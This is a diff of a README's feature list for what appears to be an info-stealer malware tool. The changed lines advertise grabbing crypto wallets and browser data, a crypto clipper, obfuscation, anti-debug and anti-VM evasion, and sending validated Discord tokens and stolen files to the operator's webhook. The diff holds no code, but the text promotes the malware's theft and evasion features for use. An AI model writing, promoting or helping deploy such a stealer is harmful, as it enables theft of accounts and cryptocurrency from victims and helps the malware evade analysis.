@@ -45,16 +45,16 @@
 > 
 > Discord Friends with rare badges
 > 
-> Crypto Wallets - 
-> 💸 Zcash,
-> 🚀 Armory,
-> 📀 Bytecoin,
-> 💵 Jaxx,
-> 💎 Exodus,
-> 📉 Ethereum,
-> 🔨 Electrum,
-> 🕹️ AtomicWallet,
-> 💹 Guarda,
+> Grabs crypto wallets - 
+> 💸 Zcash
+> 🚀 Armory
+> 📀 Bytecoin
+> 💵 Jaxx
+> 💎 Exodus
+> 📉 Ethereum
+> 🔨 Electrum
+> 🕹️ AtomicWallet
+> 💹 Guarda
 > ⚡ Coinomi
 > 
 > Browser (Chrome, Opera, Firefox, OperaGX, Edge, Brave, Yandex) - 
@@ -66,17 +66,17 @@
 
 #### Additional
 
-> Crypto Clipper - BTC,LTC,XMR,ETH,XRP,NEO,BCH,DOGE,DASH,XLM
+> Crypto Clipper - BTC, LTC, XMR, ETH, XRP, NEO, BCH, DOGE, DASH, XLM
 > 
-> Ultra Obfuscation
+> Ultra Obfuscation (use https://obfuscator.io)
 > 
 > Anti-Debug
 > 
 > Anti-VM
 > 
-> Checks if Discord Token is working and then sends to webhook
+> Validates a found discord token and then sends it to your discord webhook
 > 
-> Sends all FIles to Webhook in beautiful Embeds and a Zip File
+> Sends all files to your discord webhook in beautiful embeds and a structured zip file
 
 <a id="screenshot"></a>
 
